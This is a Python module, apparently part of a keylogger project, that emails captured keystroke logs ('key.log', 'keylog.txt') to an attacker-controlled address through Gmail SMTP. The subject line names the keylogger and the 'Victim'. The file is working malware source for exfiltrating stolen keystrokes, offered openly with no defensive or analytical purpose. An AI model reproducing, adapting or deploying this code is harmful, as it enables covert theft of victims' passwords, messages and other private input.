import smtplib
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText
from email.mime.base import MIMEBase
from email import encoders
from enum import Enum
import os
from dotenv import load_dotenv
import loadingEmailAnimation
import time

load_dotenv();

def set_email_of_receiver(receiver=None):
    return receiver;

class Receiver:
    @staticmethod
    def receiver_email(self, receiever):
        return receiever;


class SenderInfo(Enum):
    SENDER_EMAIL = os.getenv("SENDER_EMAIL");
    SENDER_PASSWORD_GENERATED = os.getenv("EMAIL_PASSWORD_GENERATED");
    RECIEVER_EMAIL = os.getenv("RECIEVER_EMAIL");
    MAIL_SERVER = "smtp.gmail.com";
    #mail server
    PORT = 587;

class MailSender:
    #method for sending email
    def __init__(self, log_file_name) -> None:
        self.file = log_file_name;
        #Create log and clear all old log files
        
    def send_mail(self):
        file_paths = ["key.log","keylog.txt"];
        body = "Attached files.";
        # Create a multipart message
        msg = MIMEMultipart();
        msg['From'] = SenderInfo.SENDER_EMAIL.value
        msg['To'] = SenderInfo.RECIEVER_EMAIL.value
        msg['Subject'] = 'Email with Attachment of Keylloger from Victim'
        msg.attach(MIMEText(body, "plain"))
        
        for file_path in file_paths:
             # Attach the file to the email
            with open(file_path, 'rb') as file:
                file_mime = MIMEBase('application', 'octet-stream')
                file_mime.set_payload(file.read());
            encoders.encode_base64(file_mime)
            file_mime.add_header('Content-Disposition', 'attachment', filename=file_path)
            msg.attach(file_mime)
        #record start time
        start_time = time.time();
        # Create an SMTP session
        session = smtplib.SMTP(SenderInfo.MAIL_SERVER.value, SenderInfo.PORT.value)
        # Start the SMTP session
        session.starttls()
        # Log in to the mail server
        session.login(SenderInfo.SENDER_EMAIL.value, SenderInfo.SENDER_PASSWORD_GENERATED.value)
        # Send the email
        text = msg.as_string()
        session.sendmail(SenderInfo.SENDER_EMAIL.value, SenderInfo.RECIEVER_EMAIL.value, text)
        #message
        end_time = time.time()  # Record the end time
        elapsed_time = end_time - start_time;
        #loading animation
        loadingEmailAnimation.loading_animation(elapsed_time);
        
        # Close the SMTP session
        session.quit()